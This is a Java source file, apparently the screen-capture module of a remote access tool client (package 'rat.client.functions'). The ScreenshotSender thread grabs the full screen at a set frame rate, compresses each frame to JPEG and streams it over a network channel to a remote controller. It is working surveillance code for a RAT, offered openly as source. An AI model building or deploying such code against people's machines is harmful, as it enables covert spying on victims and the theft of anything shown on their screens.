package rat.client.functions;

import org.jboss.netty.channel.Channel;
import rat.packets.IPacket;
import rat.packets.ScreenshotDataPacket;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.Objects;

public class ScreenshotSender extends Thread {

    private Channel channel;

    private volatile boolean active;

    private volatile int FPS, frameWidth, frameHeight;

    private ByteArrayOutputStream out = new ByteArrayOutputStream();

    private static Robot robot;

    static {
        try {
            robot = new Robot();
        } catch (AWTException e) {
            e.printStackTrace();
        }
    }

    public ScreenshotSender(Channel channel, int FPS, int frameWidth, int frameHeight) {
        this.channel = Objects.requireNonNull(channel);
        this.FPS = FPS;
        this.frameWidth = frameWidth;
        this.frameHeight = frameHeight;
    }

    @Override
    public void run() {
        active = true;

        while (isActive()) {
            byte[] screenshotBytes = captureScreen();
            IPacket packet = new ScreenshotDataPacket(frameWidth, frameHeight, screenshotBytes);
            channel.write(packet);

            try {
                Thread.sleep(1000 / FPS);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    private byte[] captureScreen() {
        out.reset();

        Rectangle screenSize = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());

        int bestHeight = (int) Math.min(frameHeight, screenSize.getHeight());
        int bestWidth = (int) Math.min(frameWidth, screenSize.getWidth());

        BufferedImage image = robot.createScreenCapture(screenSize);

        Image scaledImage = image.getScaledInstance(bestWidth, bestHeight, Image.SCALE_SMOOTH);
        BufferedImage bimage = new BufferedImage(scaledImage.getWidth(null), scaledImage.getHeight(null),
                BufferedImage.TYPE_INT_RGB);

        Graphics2D bGr = bimage.createGraphics();
        bGr.drawImage(scaledImage, 0, 0, null);
        bGr.dispose();
        image = bimage;

        try {
            ImageIO.write(image, "jpg", out);
        } catch (IOException e) {
            e.printStackTrace();
        }

        return out.toByteArray();
    }

    public void setFrameWidth(int frameWidth) {
        this.frameWidth = frameWidth;
    }

    public void setFrameHeight(int frameHeight) {
        this.frameHeight = frameHeight;
    }

    public void setFPS(int FPS) {
        this.FPS = FPS;
    }

    public boolean isActive() {
        return active;
    }

    public void finish() {
        active = false;
    }

}
